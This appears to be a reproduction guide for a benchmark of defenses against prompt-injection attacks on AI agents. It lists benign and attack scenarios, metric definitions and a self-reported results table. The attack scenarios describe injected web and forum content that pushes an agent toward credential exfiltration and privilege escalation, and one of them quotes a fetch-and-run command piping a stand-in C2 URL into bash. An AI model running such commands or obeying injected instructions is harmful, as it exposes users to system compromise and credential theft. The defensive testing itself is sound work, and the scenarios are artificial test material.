# Benchmark Reproduction Guide: Real-World Agent Defense Evaluation

This document details how to reproduce the quantitative evaluation comparing `agent-immunity` (`DYNAMIC_IMMUNITY`) against baseline defenses.

---

## 1. Benchmark Scenarios Overview

The benchmark testbed comprises 8 distinct real-world scenarios:
- **4 Benign Scenarios (Measuring Task Completion & False Positive Rate)**:
  1. `benign_01_api_doc_summary`: Web API doc scraping and technical report generation.
  2. `benign_02_internal_wiki_analysis`: Internal security wiki synthesis with local metrics.
  3. `benign_03_authorized_maintenance`: Explicitly user-authorized system diagnostic and uptime check.
  4. `benign_04_security_audit_regex_trap`: Legitimate audit report containing keyword tokens like `api_key` and `curl` (specifically designed to stress-test regex false positive rates).
- **4 Real-World Attack Vectors (Measuring Attack Mitigation & Self-Healing)**:
  1. `attack_01_indirect_prompt_injection_exfil`: Webpage containing latent indirect prompt injection instructing credential exfiltration.
  2. `attack_02_confused_deputy_malicious_shell`: Open-source forum post attempting to trick the agent into running a reverse shell script (`curl http://malicious-c2.net/pwn | bash`).
  3. `attack_03_unauthorized_intent_drift`: Innocent public data processing task where an injection attempts unprompted privilege escalation via `python -c socket`.
  4. `attack_04_obfuscated_token_exfiltration`: Multi-step credential theft disguised via URL-encoded payload headers directed to an unauthorized external webhook.

---

## 2. Quantitative Metric Definitions

1. **Benign Task Completion Rate**: Percentage of benign tasks that successfully produced genuine output deliverables on disk.
2. **Benign False Positive Rate (FPR)**: Percentage of benign tasks falsely terminated by the security layer.
3. **Attack Mitigation Rate (TPR / Recall)**: Percentage of malicious attacks successfully intercepted before compromise.
4. **Attack Success Rate (Leak / Pwn)**: Percentage of attacks that succeeded in leaking sensitive credentials or executing unauthorized shell commands.
5. **Self-Healing Rate**: Percentage of attacked tasks that dynamically recovered, pruned malicious branches, and delivered the user's intended benign goal.
6. **Average Latency Overhead**: Time consumed by the security layer per tool invocation (in milliseconds).

---

## 3. Empirical Results Matrix

| Defense Configuration | Benign Completion | False Positive Rate (FPR) | Mitigation Rate (TPR) | Attack Leak Rate | Self-Healing Rate | Avg Latency |
| :--- | :---: | :---: | :---: | :---: | :---: | :---: |
| **VANILLA (No Defense)** | 100.0% | 0.0% | **0.0%** | **100.0%** | 0.0% | 0.08 ms |
| **REGEX_FILTER (Static Rules)** | 75.0% | **25.0%** (False Alarm) | 75.0% | 25.0% (Polymorphic Bypass) | 0.0% | 0.06 ms |
| **LLM_SELF_GUARD (Safety Prompt)** | 100.0% | 0.0% | **0.0%** | **100.0%** | 0.0% | 0.07 ms |
| **DYNAMIC_IMMUNITY (Our Engine)** | **100.0%** | **0.0%** | **100.0%** | **0.0%** | **100.0%** | **0.21 ms** |

---

## 4. How to Run the Benchmark

Execute the evaluation script from the repository root:

```bash
python -m agent_immunity.benchmark.run_evaluation
```

Or on Windows PowerShell:

```powershell
python agent_immunity/benchmark/run_evaluation.py
```

The script will iterate through all 4 configurations across the 8 testbed scenarios and automatically update `agent_immunity/benchmark/benchmark_results.json`.
